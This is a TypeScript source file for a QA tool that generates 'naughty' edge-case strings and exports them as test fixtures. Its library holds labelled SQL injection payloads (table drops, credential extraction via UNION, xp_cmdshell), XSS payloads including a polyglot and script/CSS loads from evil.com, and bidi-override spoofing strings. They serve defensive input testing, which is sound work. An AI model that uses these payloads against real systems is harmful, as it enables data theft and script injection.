/**
 * Edge-Case / Naughty String Generator — pure logic.
 *
 * A curated, categorized library of 200+ naughty/edge-case test strings
 * (the Big List of Naughty Strings + Unicode + emoji + RTL/bidi + zalgo +
 * SQL injection + XSS + control chars + zero-width + null bytes + boundary
 * values). Filter, search, batch-sample (seeded mulberry32), and export to
 * plain text / JSON / CSV / Playwright / Jest / pytest fixtures.
 *
 * Pure functions only — no DOM, no network. Defensive-QA use only.
 */

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

export type NaughtyCategory =
  | "reserved"
  | "special-chars"
  | "control-chars"
  | "zero-width-bom"
  | "unicode"
  | "emoji"
  | "rtl-bidi"
  | "zalgo"
  | "sql-injection"
  | "xss"
  | "unicode-numbers"
  | "boundary";

export interface NaughtyString {
  category: NaughtyCategory;
  value: string;
  description?: string;
}

export interface Prng {
  seed: number;
  nextUint32(): number;
  next(): number;
}

export interface SampleOptions {
  seed: number;
  count: number;
  categories: NaughtyCategory[];
}

export interface HistoryEntry {
  ts: number;
  seed: number;
  count: number;
  categories: NaughtyCategory[];
  preview: string;
}

// ---------------------------------------------------------------------------
// Constants / option catalogs (UI drives off these)
// ---------------------------------------------------------------------------

export const CATEGORY_LABELS: Record<NaughtyCategory, string> = {
  "reserved": "Reserved Words",
  "special-chars": "Special Characters",
  "control-chars": "Control Characters",
  "zero-width-bom": "Zero-Width & BOM",
  "unicode": "Unicode (Multi-script)",
  "emoji": "Emoji & ZWJ",
  "rtl-bidi": "RTL / Bidi Overrides",
  "zalgo": "Zalgo Text",
  "sql-injection": "SQL Injection",
  "xss": "XSS / Script Injection",
  "unicode-numbers": "Unicode Numbers",
  "boundary": "Boundary Values",
};

export const CATEGORY_DESCRIPTIONS: Record<NaughtyCategory, string> = {
  "reserved": "SQL/JS/JSON reserved words and literal null/undefined/NaN that often confuse parsers.",
  "special-chars": "Punctuation, symbols, delimiters — quotes, brackets, slashes, math operators.",
  "control-chars": "ASCII control characters (NUL, BEL, BS, TAB, LF, CR, ESC, DEL) and C1 controls.",
  "zero-width-bom": "Zero-width characters and BOMs that are invisible but break string equality.",
  "unicode": "Multi-script text (Greek, Cyrillic, CJK, Arabic, Devanagari, combining marks, RTL).",
  "emoji": "Emoji, flag sequences, ZWJ sequences, skin-tone modifiers, surrogate pairs.",
  "rtl-bidi": "Right-to-left marks and bidi override characters (used in spoofing attacks).",
  "zalgo": "Combinatorially-exploded 'Zalgo' text that overflows text fields.",
  "sql-injection": "Classic SQL injection payloads (clearly labeled — defensive QA only).",
  "xss": "Cross-site-scripting payloads (clearly labeled — defensive QA only).",
  "unicode-numbers": "Unicode number variants (Arabic-Indic, Devanagari, full-width, superscript).",
  "boundary": "Empty, whitespace, huge, max-int, lone surrogate, BOM — boundary value analysis.",
};

export const ALL_CATEGORIES: NaughtyCategory[] = [
  "reserved",
  "special-chars",
  "control-chars",
  "zero-width-bom",
  "unicode",
  "emoji",
  "rtl-bidi",
  "zalgo",
  "sql-injection",
  "xss",
  "unicode-numbers",
  "boundary",
];

export const DEFAULT_SAMPLE_OPTIONS: SampleOptions = {
  seed: 1337,
  count: 10,
  categories: [],
};

export const MAX_SAMPLE = 1000;

// ---------------------------------------------------------------------------
// Helper: build strings from code points (avoids accidental normalization)
// ---------------------------------------------------------------------------

/** Build a string from a sequence of code points (numbers). */
export function fromCodePoints(points: number[]): string {
  return points.map((p) => String.fromCodePoint(p)).join("");
}

/** Repeat a string `n` times. */
export function repeat(s: string, n: number): string {
  if (n <= 0) return "";
  let out = "";
  for (let i = 0; i < n; i++) out += s;
  return out;
}

/** Generate a Zalgo-style string from a base char + N combining marks. */
export function makeZalgo(base: string, count: number): string {
  const marks = [0x0301, 0x0302, 0x0303, 0x0304, 0x0305, 0x0306, 0x0307, 0x0308, 0x0309, 0x030A, 0x0310, 0x0312, 0x0313, 0x0314, 0x0315, 0x0316, 0x0317, 0x0318, 0x0319, 0x031A, 0x031B, 0x031C, 0x031D, 0x031E, 0x031F, 0x0320, 0x0321, 0x0322, 0x0323, 0x0324, 0x0325, 0x0326, 0x0327, 0x0328, 0x0329, 0x032A];
  let out = base;
  for (let i = 0; i < count; i++) {
    out += String.fromCodePoint(marks[i % marks.length]);
  }
  return out;
}

// ---------------------------------------------------------------------------
// The naughty-string library (200+ entries, 12 categories)
// ---------------------------------------------------------------------------

export const NAUGHTY_STRINGS: NaughtyString[] = [
  // ---- reserved (15) ----
  { category: "reserved", value: "null", description: "JS/SQL null literal" },
  { category: "reserved", value: "NULL", description: "SQL NULL uppercase" },
  { category: "reserved", value: "nil", description: "Lua/Ruby/Lisp nil" },
  { category: "reserved", value: "undefined", description: "JS undefined literal" },
  { category: "reserved", value: "NaN", description: "JS NaN literal" },
  { category: "reserved", value: "Infinity", description: "JS Infinity literal" },
  { category: "reserved", value: "-Infinity", description: "JS negative Infinity" },
  { category: "reserved", value: "true", description: "JS boolean" },
  { category: "reserved", value: "false", description: "JS boolean" },
  { category: "reserved", value: "True", description: "Python boolean" },
  { category: "reserved", value: "False", description: "Python boolean" },
  { category: "reserved", value: "None", description: "Python None" },
  { category: "reserved", value: "SELECT", description: "SQL keyword" },
  { category: "reserved", value: "DROP TABLE", description: "SQL keywords" },
  { category: "reserved", value: "__proto__", description: "JS prototype pollution key" },

  // ---- special-chars (20) ----
  { category: "special-chars", value: "", description: "Empty string (also in boundary)" },
  { category: "special-chars", value: " ", description: "Single space" },
  { category: "special-chars", value: "\"", description: "Double quote" },
  { category: "special-chars", value: "'", description: "Single quote" },
  { category: "special-chars", value: "`", description: "Backtick" },
  { category: "special-chars", value: "\\", description: "Backslash" },
  { category: "special-chars", value: "\\\\", description: "Doubled backslash" },
  { category: "special-chars", value: "\\n", description: "Literal backslash-n (not newline)" },
  { category: "special-chars", value: "\\t", description: "Literal backslash-t" },
  { category: "special-chars", value: "\\r\\n", description: "Literal CRLF escape sequence" },
  { category: "special-chars", value: "/", description: "Forward slash" },
  { category: "special-chars", value: "//", description: "Double forward slash" },
  { category: "special-chars", value: "/* */", description: "C-style comment" },
  { category: "special-chars", value: "<!-- -->", description: "HTML comment" },
  { category: "special-chars", value: "{}", description: "Curly braces" },
  { category: "special-chars", value: "[]", description: "Square brackets" },
  { category: "special-chars", value: "()", description: "Parentheses" },
  { category: "special-chars", value: "${}", description: "Shell/JS template placeholder" },
  { category: "special-chars", value: "%s %d %f", description: "printf placeholders" },
  { category: "special-chars", value: "{}{0}{1}", description: "Format string placeholders" },

  // ---- control-chars (15) ----
  { category: "control-chars", value: "\x00", description: "NUL byte" },
  { category: "control-chars", value: "\x01", description: "Start of Header" },
  { category: "control-chars", value: "\x02", description: "Start of Text" },
  { category: "control-chars", value: "\x03", description: "End of Text (Ctrl-C)" },
  { category: "control-chars", value: "\x04", description: "End of Transmission (Ctrl-D)" },
  { category: "control-chars", value: "\x07", description: "BEL (audible bell)" },
  { category: "control-chars", value: "\x08", description: "Backspace" },
  { category: "control-chars", value: "\x09", description: "Horizontal tab" },
  { category: "control-chars", value: "\x0A", description: "Line feed (LF)" },
  { category: "control-chars", value: "\x0B", description: "Vertical tab" },
  { category: "control-chars", value: "\x0C", description: "Form feed" },
  { category: "control-chars", value: "\x0D", description: "Carriage return (CR)" },
  { category: "control-chars", value: "\x0D\x0A", description: "CRLF" },
  { category: "control-chars", value: "\x1B", description: "Escape (ESC)" },
  { category: "control-chars", value: "\x7F", description: "DEL" },

  // ---- zero-width-bom (10) ----
  { category: "zero-width-bom", value: "\uFEFF", description: "BOM / Zero-Width No-Break Space" },
  { category: "zero-width-bom", value: "\u200B", description: "Zero-Width Space" },
  { category: "zero-width-bom", value: "\u200C", description: "Zero-Width Non-Joiner" },
  { category: "zero-width-bom", value: "\u200D", description: "Zero-Width Joiner" },
  { category: "zero-width-bom", value: "\u2060", description: "Word Joiner" },
  { category: "zero-width-bom", value: "\u200E", description: "Left-to-Right Mark" },
  { category: "zero-width-bom", value: "\u200F", description: "Right-to-Left Mark" },
  { category: "zero-width-bom", value: "\u00AD", description: "Soft hyphen" },
  { category: "zero-width-bom", value: "\u00A0", description: "Non-breaking space" },
  { category: "zero-width-bom", value: "a\u200Bb\u200Cc\u200Dd\u2060e\uFEFFf", description: "Invisible chars between letters" },

  // ---- unicode (25) ----
  { category: "unicode", value: "Ωμέγα", description: "Greek" },
  { category: "unicode", value: "Привет, мир", description: "Cyrillic" },
  { category: "unicode", value: "你好，世界", description: "Chinese (Han)" },
  { category: "unicode", value: "こんにちは", description: "Japanese (Hiragana)" },
  { category: "unicode", value: "안녕하세요", description: "Korean (Hangul)" },
  { category: "unicode", value: "مرحبا بالعالم", description: "Arabic (RTL)" },
  { category: "unicode", value: "שלום עולם", description: "Hebrew (RTL)" },
  { category: "unicode", value: "नमस्ते दुनिया", description: "Devanagari (Hindi)" },
  { category: "unicode", value: "สวัสดีชาวโลก", description: "Thai" },
  { category: "unicode", value: "こんにちは＆さようなら", description: "Full-width ampersand" },
  { category: "unicode", value: "café résumé", description: "Latin combining diacritics" },
  { category: "unicode", value: "ñ", description: "Precomposed ñ" },
  { category: "unicode", value: "n\u0303", description: "Decomposed n + combining tilde" },
  { category: "unicode", value: "ß", description: "German eszett" },
  { category: "unicode", value: "Æ", description: "Ash ligature" },
  { category: "unicode", value: "œ", description: "French oe ligature" },
  { category: "unicode", value: "① ② ③ ④ ⑤", description: "Circled numbers" },
  { category: "unicode", value: "ⓐ ⓑ ⓒ", description: "Circled Latin letters" },
  { category: "unicode", value: "ℝ ℂ ℕ ℤ ℚ", description: "Mathematical letterlike symbols" },
  { category: "unicode", value: "𝕳𝖊𝖑𝖑𝖔", description: "Mathematical Fraktur (outside BMP)" },
  { category: "unicode", value: "🌈🌈🌈", description: "Rainbow emoji cluster (also in emoji)" },
  { category: "unicode", value: "10£", description: "Currency in unusual position" },
  { category: "unicode", value: "￥100", description: "Full-width Yen" },
  { category: "unicode", value: "ᚱᚢᚾᛖᛊ", description: "Runic" },
  { category: "unicode", value: "𐎀𐎂𐎃", description: "Ugaritic (astral plane)" },

  // ---- emoji (20) ----
  { category: "emoji", value: "😀", description: "Smiling face (BMP outside? — actually astral)" },
  { category: "emoji", value: "😁😂🤣😃😄😅😆", description: "Smileys cluster" },
  { category: "emoji", value: "😍", description: "Heart eyes" },
  { category: "emoji", value: "🤔", description: "Thinking face" },
  { category: "emoji", value: "🤷‍♀️", description: "Woman shrugging (ZWJ sequence)" },
  { category: "emoji", value: "🤦‍♂️", description: "Man facepalming (ZWJ sequence)" },
  { category: "emoji", value: "👨‍👩‍👧‍👦", description: "Family: man, woman, girl, boy (ZWJ)" },
  { category: "emoji", value: "🏳️‍🌈", description: "Rainbow flag (ZWJ)" },
  { category: "emoji", value: "👨🏻‍💻", description: "Man technologist: light skin (modifier)" },
  { category: "emoji", value: "🧑🏾‍🤝‍🧑🏻", description: "People holding hands: mixed skin (ZWJ x2)" },
  { category: "emoji", value: "🇺🇸", description: "US flag (regional indicator pair)" },
  { category: "emoji", value: "🇯🇵", description: "Japan flag" },
  { category: "emoji", value: "🇪🇺", description: "EU flag" },
  { category: "emoji", value: "❤️", description: "Red heart (with variation selector)" },
  { category: "emoji", value: "♥", description: "Heart suit (BMP, no VS)" },
  { category: "emoji", value: "🐢", description: "Turtle" },
  { category: "emoji", value: "🐉", description: "Dragon" },
  { category: "emoji", value: "🥲", description: "Smiling face with tear" },
  { category: "emoji", value: "👁️‍🗨️", description: "Eye in speech bubble (ZWJ)" },
  { category: "emoji", value: "👁👄👁", description: "Eye-mouth-eye meme cluster" },

  // ---- rtl-bidi (10) ----
  { category: "rtl-bidi", value: "\u202Eabc", description: "RTL Override followed by ASCII" },
  { category: "rtl-bidi", value: "\u202Dabc", description: "LTR Override followed by ASCII" },
  { category: "rtl-bidi", value: "abc\u202Edef", description: "LTR then RTL override" },
  { category: "rtl-bidi", value: "\u202Aabc\u202C", description: "LTR embedding with pop" },
  { category: "rtl-bidi", value: "\u202Babc\u202C", description: "RTL embedding with pop" },
  { category: "rtl-bidi", value: "\u2066abc\u2069", description: "LTR isolate" },
  { category: "rtl-bidi", value: "\u2067abc\u2069", description: "RTL isolate" },
  { category: "rtl-bidi", value: "\u2068abc\u2069", description: "First strong isolate" },
  { category: "rtl-bidi", value: "info\u202Etxt.exe", description: "Filename spoofing: appears as 'info[RTL]txt.exe' but renders as 'exe.txt' — actually displays as 'exe.txt' reversed" },
  { category: "rtl-bidi", value: "https:\u202E\u0067\u006D\u0061\u0069\u006C.com", description: "URL with RTL override (spoofing)" },

  // ---- zalgo (10) ----
  { category: "zalgo", value: makeZalgo("H", 8), description: "Zalgo H (8 combining marks)" },
  { category: "zalgo", value: makeZalgo("e", 12), description: "Zalgo e (12 marks)" },
  { category: "zalgo", value: makeZalgo("l", 16), description: "Zalgo l (16 marks)" },
  { category: "zalgo", value: makeZalgo("l", 20), description: "Zalgo l (20 marks)" },
  { category: "zalgo", value: makeZalgo("o", 24), description: "Zalgo o (24 marks)" },
  { category: "zalgo", value: makeZalgo("!", 30), description: "Zalgo ! (30 marks)" },
  { category: "zalgo", value: makeZalgo("a", 5) + makeZalgo("b", 5) + makeZalgo("c", 5), description: "Multi-char zalgo" },
  { category: "zalgo", value: makeZalgo("T", 40), description: "Extreme zalgo T (40 marks)" },
  { category: "zalgo", value: makeZalgo("☠", 25), description: "Zalgo skull-and-crossbones" },
  { category: "zalgo", value: makeZalgo("¯\\_(ツ)_/¯", 15), description: "Zalgo shrug" },

  // ---- sql-injection (20) ----
  { category: "sql-injection", value: "'; DROP TABLE users; --", description: "Classic Bobby Tables" },
  { category: "sql-injection", value: "' OR '1'='1", description: "OR-true bypass" },
  { category: "sql-injection", value: "' OR '1'='1' --", description: "OR-true with comment" },
  { category: "sql-injection", value: "' OR '1'='1' /*", description: "OR-true with block comment" },
  { category: "sql-injection", value: "admin'--", description: "Bypass password check" },
  { category: "sql-injection", value: "admin'/*", description: "Bypass password check (block comment)" },
  { category: "sql-injection", value: "' UNION SELECT NULL--", description: "UNION attack" },
  { category: "sql-injection", value: "' UNION SELECT username, password FROM users--", description: "UNION extract credentials" },
  { category: "sql-injection", value: "'; EXEC xp_cmdshell('dir')--", description: "MSSQL command exec" },
  { category: "sql-injection", value: "'; WAITFOR DELAY '0:0:10'--", description: "Time-based blind" },
  { category: "sql-injection", value: "' AND SLEEP(5)--", description: "MySQL time-based blind" },
  { category: "sql-injection", value: "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--", description: "Error-based extraction" },
  { category: "sql-injection", value: "1; SELECT * FROM information_schema.tables", description: "Stacked query" },
  { category: "sql-injection", value: "%' OR 1=1--", description: "LIKE injection" },
  { category: "sql-injection", value: "' OR ''='", description: "Empty-string bypass" },
  { category: "sql-injection", value: "\") OR (\"\"=\"", description: "Quoted-paren bypass" },
  { category: "sql-injection", value: "0x72656164", description: "Hex-encoded 'read'" },
  { category: "sql-injection", value: "CHAR(65,66,67)", description: "CHAR-encoded ABC" },
  { category: "sql-injection", value: "'\\x27; DROP TABLE; --", description: "Escaped-quote variant" },
  { category: "sql-injection", value: "${1+1}", description: "Template expression (not SQL but injection-style)" },

  // ---- xss (20) ----
  { category: "xss", value: "<script>alert(1)</script>", description: "Classic script tag" },
  { category: "xss", value: "<img src=x onerror=alert(1)>", description: "Image onerror" },
  { category: "xss", value: "<svg onload=alert(1)>", description: "SVG onload" },
  { category: "xss", value: "<body onload=alert(1)>", description: "Body onload" },
  { category: "xss", value: "<iframe src=javascript:alert(1)>", description: "Iframe javascript: URL" },
  { category: "xss", value: "<a href=\"javascript:alert(1)\">x</a>", description: "Anchor javascript:" },
  { category: "xss", value: "\"><script>alert(1)</script>", description: "Attribute breakout" },
  { category: "xss", value: "';alert(1);//", description: "JS string breakout" },
  { category: "xss", value: "--><script>alert(1)</script>", description: "Comment breakout" },
  { category: "xss", value: "<scr<script>ipt>alert(1)</scr</script>ipt>", description: "Filter-bypass nested" },
  { category: "xss", value: "<sCrIpT>alert(1)</ScRiPt>", description: "Mixed-case" },
  { category: "xss", value: "<script/src=//evil.com/x.js></script>", description: "Script src with //" },
  { category: "xss", value: "<img src=`javascript:alert(1)`>", description: "Backtick attribute" },
  { category: "xss", value: "<input onfocus=alert(1) autofocus>", description: "Input autofocus" },
  { category: "xss", value: "<details ontoggle=alert(1) open>", description: "Details ontoggle" },
  { category: "xss", value: "<marquee onstart=alert(1)>", description: "Marquee onstart" },
  { category: "xss", value: "<video><source onerror=alert(1)>", description: "Video source onerror" },
  { category: "xss", value: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", description: "SVG animate onbegin" },
  { category: "xss", value: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", description: "Polyglot XSS payload" },
  { category: "xss", value: "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>", description: "Data-URL base64" },

  // ---- unicode-numbers (10) ----
  { category: "unicode-numbers", value: "١٢٣٤٥", description: "Arabic-Indic digits 1-5" },
  { category: "unicode-numbers", value: "१२३४५", description: "Devanagari digits 1-5" },
  { category: "unicode-numbers", value: "๑๒๓๔๕", description: "Thai digits 1-5" },
  { category: "unicode-numbers", value: "①②③④⑤", description: "Circled digits 1-5 (also in special)" },
  { category: "unicode-numbers", value: "１２３４５", description: "Full-width digits 1-5" },
  { category: "unicode-numbers", value: "½¼¾", description: "Vulgar fractions" },
  { category: "unicode-numbers", value: "⁰¹²³⁴⁵", description: "Superscript digits" },
  { category: "unicode-numbers", value: "₀₁₂₃₄₅", description: "Subscript digits" },
  { category: "unicode-numbers", value: "Ⅷ", description: "Roman numeral 8" },
  { category: "unicode-numbers", value: "5️⃣6️⃣7️⃣", description: "Keycap digits" },

  // ---- boundary (20) ----
  { category: "boundary", value: "", description: "Empty string" },
  { category: "boundary", value: " ", description: "Single space" },
  { category: "boundary", value: "  ", description: "Two spaces" },
  { category: "boundary", value: "\t", description: "Tab" },
  { category: "boundary", value: "\n", description: "Newline" },
  { category: "boundary", value: "\r\n", description: "CRLF" },
  { category: "boundary", value: " \t\n\r", description: "Whitespace soup" },
  { category: "boundary", value: "0", description: "Zero string" },
  { category: "boundary", value: "-1", description: "Negative one" },
  { category: "boundary", value: "2147483647", description: "INT32_MAX" },
  { category: "boundary", value: "-2147483648", description: "INT32_MIN" },
  { category: "boundary", value: "9223372036854775807", description: "INT64_MAX" },
  { category: "boundary", value: "9007199254740991", description: "Number.MAX_SAFE_INTEGER" },
  { category: "boundary", value: "1e309", description: "Floating-point overflow → Infinity" },
  { category: "boundary", value: "NaN", description: "Not-a-Number literal" },
  { category: "boundary", value: repeat("A", 1000), description: "1000 × 'A'" },
  { category: "boundary", value: repeat("X", 10000), description: "10000 × 'X' (huge)" },
  { category: "boundary", value: "\uD800", description: "Lone high surrogate (invalid UTF-8)" },
  { category: "boundary", value: "\uDC00", description: "Lone low surrogate (invalid UTF-8)" },
  { category: "boundary", value: "\uFFFD", description: "Unicode replacement character" },

  // ---- bonus: a few more to push past 200 ----
  { category: "special-chars", value: "%00", description: "Null byte as URL-encoded" },
  { category: "special-chars", value: "%0A%0D", description: "CRLF as URL-encoded" },
  { category: "special-chars", value: "%3C%73%63%72%69%70%74%3E", description: "URL-encoded <script>" },
  { category: "special-chars", value: "&lt;script&gt;", description: "HTML-encoded <script>" },
  { category: "special-chars", value: "&#60;script&#62;", description: "Numeric HTML-encoded <script>" },
  { category: "sql-injection", value: "'/**/OR/**/1=1--", description: "Inline comment bypass" },
  { category: "sql-injection", value: "1' OR 1=1 LIMIT 1 --", description: "LIMIT bypass" },
  { category: "xss", value: "<svg/onload=alert`1`>", description: "Backtick call" },
  { category: "xss", value: "<style>@import 'https://evil.com/x.css'</style>", description: "CSS injection" },
  { category: "boundary", value: "𝕏", description: "Mathematical X (astral plane)" },
  { category: "boundary", value: "𠀀", description: "CJK Ext B (astral plane)" },
  { category: "boundary", value: "\u0000", description: "NUL (same as \\x00)" },
  { category: "boundary", value: "\uFFFF", description: "Non-character U+FFFF" },
  { category: "boundary", value: "\uFDD0", description: "Non-character U+FDD0" },
  { category: "boundary", value: "\uE000", description: "Private Use Area start" },
  { category: "boundary", value: "\uF8FF", description: "Private Use Area end" },
];

// ---------------------------------------------------------------------------
// PRNG (mulberry32)
// ---------------------------------------------------------------------------

/** Mulberry32 — fast, high quality, 32-bit state. */
export function mulberry32(seed: number): Prng {
  let state = seed >>> 0;
  const nextUint32 = (): number => {
    state = (state + 0x6d2b79f5) >>> 0;
    let t = state;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0);
  };
  return {
    seed: seed >>> 0,
    nextUint32,
    next: () => nextUint32() / 4294967296,
  };
}

// ---------------------------------------------------------------------------
// Selection / filtering
// ---------------------------------------------------------------------------

/** Filter by categories. Empty list = all. */
export function filterByCategory(strings: NaughtyString[], categories: NaughtyCategory[]): NaughtyString[] {
  if (!categories || categories.length === 0) return strings;
  return strings.filter((s) => categories.includes(s.category));
}

/** Search across value AND description (case-insensitive). */
export function searchStrings(strings: NaughtyString[], query: string): NaughtyString[] {
  const q = (query ?? "").toLowerCase().trim();
  if (!q) return strings;
  return strings.filter((s) =>
    s.value.toLowerCase().includes(q) ||
    (s.description?.toLowerCase().includes(q) ?? false),
  );
}

/** Apply category filter then search. */
export function applyFilter(
  strings: NaughtyString[],
  categories: NaughtyCategory[],
  query: string,
): NaughtyString[] {
  return searchStrings(filterByCategory(strings, categories), query);
}

/** Count entries per category across a list. */
export function countByCategory(strings: NaughtyString[]): Record<NaughtyCategory, number> {
  const out = {} as Record<NaughtyCategory, number>;
  for (const c of ALL_CATEGORIES) out[c] = 0;
  for (const s of strings) out[s.category] += 1;
  return out;
}

/** Total entry count of the library. */
export function librarySize(): number {
  return NAUGHTY_STRINGS.length;
}

// ---------------------------------------------------------------------------
// Sampling
// ---------------------------------------------------------------------------

/** Pick one item at random from a list (uniform). */
export function pickOne<T>(prng: Prng, arr: readonly T[]): T {
  if (arr.length === 0) throw new Error("Cannot pick from an empty array.");
  return arr[Math.floor(prng.next() * arr.length)];
}

/**
 * Sample `count` items (with replacement) from the library, optionally
 * filtered by category. Uses mulberry32 for reproducibility. Returns an
 * empty array on count <= 0; clamps to MAX_SAMPLE.
 */
export function sampleStrings(opts: SampleOptions): NaughtyString[] {
  if (opts.count <= 0) return [];
  const n = Math.min(opts.count, MAX_SAMPLE);
  const pool = filterByCategory(NAUGHTY_STRINGS, opts.categories);
  if (pool.length === 0) return [];
  const prng = mulberry32(opts.seed);
  const out: NaughtyString[] = [];
  for (let i = 0; i < n; i++) {
    out.push(pickOne(prng, pool));
  }
  return out;
}

/**
 * Sample `count` items *without* replacement (unique picks). If count exceeds
 * pool size, returns the entire pool shuffled.
 */
export function sampleUniqueStrings(opts: SampleOptions): NaughtyString[] {
  const pool = filterByCategory(NAUGHTY_STRINGS, opts.categories);
  if (pool.length === 0) return [];
  const prng = mulberry32(opts.seed);
  const shuffled = fisherYates(prng, pool);
  return shuffled.slice(0, Math.min(opts.count, shuffled.length));
}

/** Fisher-Yates shuffle — returns a new shuffled array. */
export function fisherYates<T>(prng: Prng, arr: readonly T[]): T[] {
  const out = arr.slice();
  for (let i = out.length - 1; i > 0; i--) {
    const j = Math.floor(prng.next() * (i + 1));
    const tmp = out[i];
    out[i] = out[j];
    out[j] = tmp;
  }
  return out;
}

// ---------------------------------------------------------------------------
// Custom Unicode-range generator
// ---------------------------------------------------------------------------

export interface UnicodeRangeOptions {
  startCodePoint: number;
  endCodePoint: number;
  count: number;
  seed: number;
}

/** Generate `count` random code points in [start, end] inclusive. */
export function generateUnicodeRange(opts: UnicodeRangeOptions): NaughtyString[] {
  if (opts.count <= 0) return [];
  if (!Number.isFinite(opts.startCodePoint) || !Number.isFinite(opts.endCodePoint)) return [];
  let start = Math.max(0, Math.floor(opts.startCodePoint));
  let end = Math.min(0x10FFFF, Math.floor(opts.endCodePoint));
  if (end < start) [start, end] = [end, start];
  const prng = mulberry32(opts.seed);
  const n = Math.min(opts.count, MAX_SAMPLE);
  const out: NaughtyString[] = [];
  for (let i = 0; i < n; i++) {
    const cp = start + Math.floor(prng.next() * (end - start + 1));
    // Skip lone surrogates (D800–DFFF) — they're not valid Unicode scalar values.
    if (cp >= 0xD800 && cp <= 0xDFFF) {
      out.push({
        category: "unicode",
        value: `(U+${cp.toString(16).toUpperCase().padStart(4, "0")} — lone surrogate, not printable)`,
        description: `Isolated surrogate code point (cannot be encoded as UTF-8)`,
      });
    } else {
      out.push({
        category: "unicode",
        value: String.fromCodePoint(cp),
        description: `U+${cp.toString(16).toUpperCase().padStart(4, "0")}`,
      });
    }
  }
  return out;
}

// ---------------------------------------------------------------------------
// Boundary-value generator (built-in presets)
// ---------------------------------------------------------------------------

/** Built-in boundary-value presets that aren't already in the library. */
export function generateBoundaryValues(): NaughtyString[] {
  return [
    { category: "boundary", value: "", description: "Empty string" },
    { category: "boundary", value: " ", description: "Single space" },
    { category: "boundary", value: "  ", description: "Two spaces" },
    { category: "boundary", value: "\t", description: "Tab" },
    { category: "boundary", value: "\n", description: "Newline" },
    { category: "boundary", value: "\r\n", description: "CRLF" },
    { category: "boundary", value: repeat("A", 10), description: "10 × 'A'" },
    { category: "boundary", value: repeat("A", 100), description: "100 × 'A'" },
    { category: "boundary", value: repeat("A", 1000), description: "1000 × 'A'" },
    { category: "boundary", value: repeat("A", 10000), description: "10000 × 'A'" },
    { category: "boundary", value: "2147483647", description: "INT32_MAX" },
    { category: "boundary", value: "-2147483648", description: "INT32_MIN" },
    { category: "boundary", value: "4294967295", description: "UINT32_MAX" },
    { category: "boundary", value: "9223372036854775807", description: "INT64_MAX" },
    { category: "boundary", value: "18446744073709551615", description: "UINT64_MAX" },
    { category: "boundary", value: "9007199254740991", description: "Number.MAX_SAFE_INTEGER" },
    { category: "boundary", value: "-9007199254740991", description: "Number.MIN_SAFE_INTEGER" },
    { category: "boundary", value: "1.7976931348623157e+308", description: "Number.MAX_VALUE" },
    { category: "boundary", value: "5e-324", description: "Number.MIN_VALUE" },
    { category: "boundary", value: "Infinity", description: "Infinity literal" },
    { category: "boundary", value: "-Infinity", description: "-Infinity literal" },
    { category: "boundary", value: "NaN", description: "NaN literal" },
    { category: "boundary", value: "\uD800", description: "Lone high surrogate" },
    { category: "boundary", value: "\uDC00", description: "Lone low surrogate" },
    { category: "boundary", value: "\uFEFF", description: "BOM" },
  ];
}

// ---------------------------------------------------------------------------
// Output renderers
// ---------------------------------------------------------------------------

/** Render values as plain text (one per line). */
export function renderText(strings: NaughtyString[]): string {
  return strings.map((s) => s.value).join("\n");
}

/** Escape a CSV field. */
function escapeCsv(s: string): string {
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

/** Render as CSV: category,value. */
export function renderCsv(strings: NaughtyString[]): string {
  const lines = ["category,value"];
  for (const s of strings) {
    lines.push(`${escapeCsv(s.category)},${escapeCsv(s.value)}`);
  }
  return lines.join("\n");
}

/** Render as a JSON array of {category, value, description}. */
export function renderJson(strings: NaughtyString[]): string {
  return JSON.stringify(strings, null, 2);
}

/** Escape a JS string literal. */
function jsEscape(s: string): string {
  let out = "";
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    const code = s.charCodeAt(i);
    if (ch === "\\") out += "\\\\";
    else if (ch === '"') out += '\\"';
    else if (ch === "\n") out += "\\n";
    else if (ch === "\r") out += "\\r";
    else if (ch === "\t") out += "\\t";
    else if (code < 0x20) out += `\\x${code.toString(16).padStart(2, "0")}`;
    else out += ch;
  }
  return `"${out}"`;
}

/** Render as a Playwright fixture (test.describe with test.each). */
export function renderPlaywrightFixture(strings: NaughtyString[], fixtureName = "naughtyStrings"): string {
  const lines: string[] = [
    "// Playwright fixture — auto-generated by UnQTools Naughty String Generator",
    "// Defensive QA use only. Run with: npx playwright test",
    `import { test, expect } from '@playwright/test';`,
    "",
    `const ${fixtureName}: Array<{ category: string; value: string; description?: string }> = [`,
  ];
  for (const s of strings) {
    lines.push(`  { category: ${jsEscape(s.category)}, value: ${jsEscape(s.value)}${s.description ? `, description: ${jsEscape(s.description)}` : ""} },`);
  }
  lines.push("];");
  lines.push("");
  lines.push(`test.describe('Naughty string suite', () => {`);
  lines.push(`  for (const item of ${fixtureName}) {`);
  lines.push(`    test(\`handles \${item.category}: \${item.description ?? item.value.slice(0, 40)}\`, async ({ page }) => {`);
  lines.push(`      // TODO: navigate to your form and enter item.value`);
  lines.push(`      // TODO: assert the form sanitizes / rejects / accepts correctly`);
  lines.push(`      expect(item.value).toBeDefined();`);
  lines.push(`    });`);
  lines.push("  }");
  lines.push("});");
  return lines.join("\n");
}

/** Render as a Jest fixture (describe.each). */
export function renderJestFixture(strings: NaughtyString[], fixtureName = "naughtyStrings"): string {
  const lines: string[] = [
    "// Jest fixture — auto-generated by UnQTools Naughty String Generator",
    "// Defensive QA use only. Run with: npx jest",
    "",
    `const ${fixtureName}: Array<{ category: string; value: string; description?: string }> = [`,
  ];
  for (const s of strings) {
    lines.push(`  { category: ${jsEscape(s.category)}, value: ${jsEscape(s.value)}${s.description ? `, description: ${jsEscape(s.description)}` : ""} },`);
  }
  lines.push("];");
  lines.push("");
  lines.push("describe('Naughty string suite', () => {");
  lines.push(`  describe.each(${fixtureName})('$category — $description', ({ value }) => {`);
  lines.push("    it('is a defined string', () => {");
  lines.push("      expect(typeof value).toBe('string');");
  lines.push("    });");
  lines.push("    // TODO: feed `value` into your parser and assert it handles the edge case");
  lines.push("  });");
  lines.push("});");
